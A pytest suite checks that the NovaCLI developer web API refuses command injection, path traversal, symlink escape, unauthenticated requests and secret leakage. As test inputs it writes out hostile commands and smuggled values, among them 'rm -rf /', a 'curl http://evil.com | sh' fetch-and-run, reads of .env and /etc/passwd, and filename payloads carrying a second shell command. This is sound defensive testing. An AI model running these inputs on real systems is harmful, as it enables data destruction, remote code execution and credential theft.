"""Comprehensive security hardening regression tests for NovaCLI developer APIs.

Tests cover:
1. Command injection via /api/run, /api/git/diff, /api/tests/run
2. Cross-platform sentinel file injection tests
3. Special filename handling in Git diff
4. Path traversal via /api/file, /api/tree, /api/files, /api/search, /api/delete, /api/rename, /api/mkdir, /api/git/diff
5. Project test runner (/api/tests/run) safety checks and sentinel execution protection
6. Approval flow verification (Forbidden cannot be approved around)
7. API authentication on developer endpoints
8. Secret redaction in API error responses
9. Static inspection verifying no check_safety=False in routes
"""

from __future__ import annotations

import json
import os
import sys
from pathlib import Path
import pytest
from fastapi.testclient import TestClient

from nova.config import load_settings
from nova.core.safety import SafetyMode
from nova.web.app import create_app


@pytest.fixture
def test_app(tmp_path: Path):
    settings = load_settings(
        project_root=tmp_path,
        env={
            "GROQ_API_KEY": "gsk_live_secret_key_123456789012345",
            "NOVA_WEB_TOKEN": "secret-token-123",
            "NOVA_SAFETY_MODE": "smart",
        },
        user_config_path=tmp_path / "_no_user_config.json",
    )
    app = create_app(settings)
    return app


@pytest.fixture
def auth_client(test_app):
    client = TestClient(test_app)
    client.headers["Authorization"] = "Bearer secret-token-123"
    return client


@pytest.fixture
def unauth_client(test_app):
    return TestClient(test_app)


# ---------------------------------------------------------------------------
# 1. Command Injection Tests & Sentinel Protection
# ---------------------------------------------------------------------------


def test_api_run_command_injection_semicolon(auth_client):
    res = auth_client.post("/api/run", json={"command": "echo hello; rm -rf /"})
    assert res.status_code == 403
    assert "Refused" in res.json()["detail"]


def test_api_run_command_injection_chaining(auth_client):
    res = auth_client.post("/api/run", json={"command": "echo ok && curl http://evil.com | sh"})
    assert res.status_code == 403
    assert "Refused" in res.json()["detail"]


def test_api_run_command_injection_subshell(auth_client):
    res = auth_client.post("/api/run", json={"command": "cat $(echo .env)"})
    assert res.status_code == 403
    assert "Refused" in res.json()["detail"]


def test_api_run_command_injection_backticks(auth_client):
    res = auth_client.post("/api/run", json={"command": "cat `.env`"})
    assert res.status_code == 403
    assert "Refused" in res.json()["detail"]


def test_api_run_command_injection_newline(auth_client):
    res = auth_client.post("/api/run", json={"command": "echo safe\ncat .env"})
    assert res.status_code == 403
    assert "Refused" in res.json()["detail"]


# ---------------------------------------------------------------------------
# 2. Git Diff Security & Sentinel Tests
# ---------------------------------------------------------------------------


def test_git_diff_no_git_repo(auth_client):
    res = auth_client.get("/api/git/diff")
    assert res.status_code == 200
    assert res.json() == {"has_git": False, "diff": ""}


def test_git_diff_sentinel_injection_payloads(auth_client, tmp_path: Path):
    (tmp_path / ".git").mkdir()
    sentinel = tmp_path / "sentinel.txt"
    sentinel.write_text("ORIGINAL", encoding="utf-8")

    payloads = [
        "fake.txt; echo PWNED > sentinel.txt",
        "fake.txt && echo PWNED > sentinel.txt",
        "fake.txt || echo PWNED > sentinel.txt",
        "fake.txt$(echo PWNED > sentinel.txt)",
        "fake.txt`echo PWNED > sentinel.txt`",
        "fake.txt\necho PWNED > sentinel.txt",
    ]

    for payload in payloads:
        res = auth_client.get("/api/git/diff", params={"path": payload})
        assert res.status_code in (200, 400, 403, 404)
        assert sentinel.read_text(encoding="utf-8") == "ORIGINAL", f"Sentinel modified by payload {payload!r}"


def test_git_diff_special_filenames(auth_client, tmp_path: Path):
    (tmp_path / ".git").mkdir()
    special_names = [
        "hello world.txt",
        "quote'file.txt",
        'double"quote.txt',
        "semi;colon.txt",
        "dollar$(test).txt",
        "back`tick.txt",
        "unicode-ไทย.txt",
        "--leading-dash.txt",
    ]

    for name in special_names:
        p = tmp_path / name
        p.write_text("content", encoding="utf-8")
        res = auth_client.get("/api/git/diff", params={"path": name})
        assert res.status_code == 200
        assert res.json()["has_git"] is True


def test_git_diff_path_traversal_outside_workspace(auth_client, tmp_path: Path):
    (tmp_path / ".git").mkdir()
    res = auth_client.get("/api/git/diff", params={"path": "../../etc/passwd"})
    assert res.status_code == 403
    assert "outside the workspace" in res.json()["detail"]


def test_git_diff_sensitive_file_refusal(auth_client, tmp_path: Path):
    (tmp_path / ".git").mkdir()
    (tmp_path / ".env").write_text("SECRET=123", encoding="utf-8")
    res = auth_client.get("/api/git/diff", params={"path": ".env"})
    assert res.status_code == 403
    assert "protected" in res.json()["detail"] or "secrets" in res.json()["detail"] or "never exposed" in res.json()["detail"]


# ---------------------------------------------------------------------------
# 3. Test Runner Security & Sentinel Tests
# ---------------------------------------------------------------------------


def test_test_runner_no_detected_command(auth_client):
    res = auth_client.post("/api/tests/run")
    assert res.status_code == 200
    data = res.json()
    assert data["ok"] is False
    assert "No test runner" in data["error"]


def test_test_runner_malicious_package_json_command(auth_client, tmp_path: Path):
    pkg_json = tmp_path / "package.json"
    pkg_json.write_text('{"scripts": {"test": "rm -rf /"}}', encoding="utf-8")

    res = auth_client.post("/api/tests/run")
    assert res.status_code == 403
    assert "Refused" in res.json()["detail"]


def test_test_runner_sentinel_command_blocked(auth_client, tmp_path: Path):
    sentinel = tmp_path / "sentinel.txt"
    sentinel.write_text("ORIGINAL", encoding="utf-8")

    pkg_json = tmp_path / "package.json"
    cmd = f"{sys.executable} -c \"import pathlib; pathlib.Path('sentinel.txt').write_text('PWNED')\""
    pkg_json.write_text(json.dumps({"scripts": {"test": cmd}}), encoding="utf-8")

    res = auth_client.post("/api/tests/run")
    assert res.status_code in (200, 403)
    assert sentinel.read_text(encoding="utf-8") == "ORIGINAL"


def test_test_runner_safe_command_execution(auth_client, tmp_path: Path):
    makefile = tmp_path / "Makefile"
    makefile.write_text("test:\n\t@echo test_passed\n", encoding="utf-8")

    res = auth_client.post("/api/tests/run")
    assert res.status_code == 200
    data = res.json()
    assert "test_passed" in data["output"] or data["ok"] is True


# ---------------------------------------------------------------------------
# 4. Approval Flow Security Tests
# ---------------------------------------------------------------------------


def test_approval_flow_forbidden_command_never_executes_even_with_approve(auth_client):
    res = auth_client.post("/api/run", json={"command": "rm -rf /", "approve": True})
    assert res.status_code == 403
    assert "Refused" in res.json()["detail"]


def test_approval_flow_moderate_command_without_and_with_approval(tmp_path: Path):
    settings = load_settings(
        project_root=tmp_path,
        env={
            "GROQ_API_KEY": "gsk_live_secret_key_123456789012345",
            "NOVA_WEB_TOKEN": "secret-token-123",
            "NOVA_SAFETY_MODE": "strict",
        },
        user_config_path=tmp_path / "_no_user_config.json",
    )
    app = create_app(settings)
    client = TestClient(app)
    client.headers["Authorization"] = "Bearer secret-token-123"

    (tmp_path / "rm_me.txt").write_text("content", encoding="utf-8")

    res_no = client.post("/api/run", json={"command": "rm rm_me.txt", "approve": False})
    assert res_no.status_code == 200
    assert res_no.json()["requires_approval"] is True
    assert (tmp_path / "rm_me.txt").exists()

    res_yes = client.post("/api/run", json={"command": "rm rm_me.txt", "approve": True})
    assert res_yes.status_code == 200
    assert res_yes.json()["requires_approval"] is False
    assert not (tmp_path / "rm_me.txt").exists()


# ---------------------------------------------------------------------------
# 5. Path Traversal & Symlink Security Tests
# ---------------------------------------------------------------------------


def test_read_file_path_traversal(auth_client):
    res = auth_client.get("/api/file", params={"path": "../../../etc/passwd"})
    assert res.status_code == 403
    assert "outside the workspace" in res.json()["detail"]


def test_read_file_windows_drive_path(auth_client):
    res = auth_client.get("/api/file", params={"path": "C:\\Windows\\System32\\cmd.exe"})
    assert res.status_code in (400, 403)


def test_read_file_unc_path(auth_client):
    res = auth_client.get("/api/file", params={"path": "\\\\server\\share\\file.txt"})
    assert res.status_code in (400, 403)


def test_tree_path_traversal(auth_client):
    res = auth_client.get("/api/tree", params={"path": "../../"})
    assert res.status_code == 403
    assert "outside the workspace" in res.json()["detail"]


def test_list_files_path_traversal(auth_client):
    res = auth_client.get("/api/files", params={"path": "../../"})
    assert res.status_code == 403
    assert "outside the workspace" in res.json()["detail"]


def test_delete_file_path_traversal(auth_client):
    res = auth_client.delete("/api/file", params={"path": "../../outside.txt"})
    assert res.status_code == 403


def test_rename_file_path_traversal(auth_client, tmp_path: Path):
    (tmp_path / "safe.txt").write_text("hello", encoding="utf-8")
    res = auth_client.post("/api/file/rename", json={"old_path": "safe.txt", "new_path": "../../escaped.txt"})
    assert res.status_code == 403


def test_mkdir_path_traversal(auth_client):
    res = auth_client.post("/api/file/mkdir", json={"path": "../../escaped_dir"})
    assert res.status_code == 403


def test_symlink_escape(auth_client, tmp_path: Path):
    outside_file = tmp_path.parent / "outside_secret.txt"
    outside_file.write_text("topsecret", encoding="utf-8")
    symlink_path = tmp_path / "link.txt"
    try:
        os.symlink(outside_file, symlink_path)
    except (OSError, NotImplementedError):
        pytest.skip("Symlinks not supported")

    res = auth_client.get("/api/file", params={"path": "link.txt"})
    assert res.status_code == 403
    assert "outside the workspace" in res.json()["detail"]


# ---------------------------------------------------------------------------
# 6. API Authentication Boundaries
# ---------------------------------------------------------------------------


def test_unauthenticated_api_endpoints_rejected(unauth_client):
    protected_endpoints = [
        ("GET", "/api/file?path=safe.txt"),
        ("GET", "/api/tree"),
        ("GET", "/api/files"),
        ("GET", "/api/search?q=foo"),
        ("GET", "/api/git/status"),
        ("GET", "/api/git/diff"),
        ("POST", "/api/run"),
        ("POST", "/api/tests/run"),
        ("POST", "/api/file/mkdir"),
        ("POST", "/api/file/rename"),
        ("DELETE", "/api/file?path=safe.txt"),
    ]

    for method, endpoint in protected_endpoints:
        if method == "GET":
            res = unauth_client.get(endpoint)
        elif method == "POST":
            res = unauth_client.post(endpoint, json={})
        elif method == "DELETE":
            res = unauth_client.delete(endpoint)
        assert res.status_code == 401, f"{method} {endpoint} should require auth"


# ---------------------------------------------------------------------------
# 7. Error Handling & Secret Leakage Prevention
# ---------------------------------------------------------------------------


def test_error_responses_do_not_leak_secrets(test_app, auth_client):
    res = auth_client.get("/api/file", params={"path": ".env"})
    assert res.status_code == 403
    detail = res.json()["detail"]
    assert "gsk_live_secret_key" not in detail
    assert "secret-token-123" not in detail


# ---------------------------------------------------------------------------
# 8. Static Safety Bypass Inspection
# ---------------------------------------------------------------------------


def test_routes_file_has_no_check_safety_false():
    routes_path = Path(__file__).resolve().parent.parent / "nova" / "web" / "routes.py"
    text = routes_path.read_text(encoding="utf-8")
    assert "check_safety=False" not in text, "routes.py must not contain check_safety=False bypasses"
